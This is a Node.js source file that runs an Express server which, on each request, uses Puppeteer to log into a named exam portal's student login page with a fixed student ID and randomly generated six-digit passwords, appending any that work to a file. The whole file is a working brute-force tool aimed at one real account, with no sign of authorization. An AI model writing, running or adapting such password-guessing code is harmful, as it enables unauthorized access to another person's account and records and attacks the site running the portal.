const express = require('express');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer-core');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;
const CHROME_PATH = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
const RANDOM_NUMBER_COUNT = 7; // Number of random unique numbers to generate per batch
const OUTPUT_FILE = 'correctRollNum.txt'; // File to store successful roll numbers

app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine', '.hbs');

// Function to generate unique random numbers within a specified range
function generateUniqueRandomNumbers(count, min, max) {
    const numbers = new Set();
    while (numbers.size < count) {
        const randomNum = Math.floor(Math.random() * (max - min + 1)) + min;
        numbers.add(randomNum);
    }
    return Array.from(numbers);
}

// Function to submit form and extract data using Puppeteer
async function submitFormAndExtractData(rollNumber) {
    const browser = await puppeteer.launch({ executablePath: CHROME_PATH, headless: false });
    const page = await browser.newPage();

    try {
        await page.goto('https://www.bvvjdpexam.in/public/authentication/student_login', { waitUntil: 'networkidle2', timeout: 60000 });

        // Fill out and submit the form
        await page.type('input[name="USER_ID"]', 'SMKP210149889');
        await page.type('input[name="PASSWORD"]', `${rollNumber}`);
        await Promise.all([
            page.click('button[type="submit"]'),
            page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 60000 })
        ]);

        // Check the URL or content for success or failure indication
        const currentURL = page.url();
        const loginSuccessful = !currentURL.includes('student_login');

        if (loginSuccessful) {
            // Append the successful roll number to the file
            fs.appendFileSync(OUTPUT_FILE, `${rollNumber}\n`);
        }

        return { rollNumber, loginSuccessful };
    } catch (error) {
        console.error(`Error in Puppeteer operation for roll number ${rollNumber}: ${error.message}`);
        return { rollNumber, error: error.message };
    } finally {
        await browser.close();
    }
}

app.get('/', async(req, res) => {
    try {
        // Generate RANDOM_NUMBER_COUNT unique random numbers between 100000 and 999999
        const randomNumbers = generateUniqueRandomNumbers(RANDOM_NUMBER_COUNT, 100000, 999999);

        // Process the generated random numbers
        const promises = randomNumbers.map(num => submitFormAndExtractData(num));
        const jsonData = await Promise.all(promises);

        res.send({ jsonData });
    } catch (error) {
        console.error(`Error: ${error.message}`);
        res.status(500).send('Internal Server Error');
    }
});

app.listen(PORT, () => {
    console.log(`Running on ${PORT}`);
});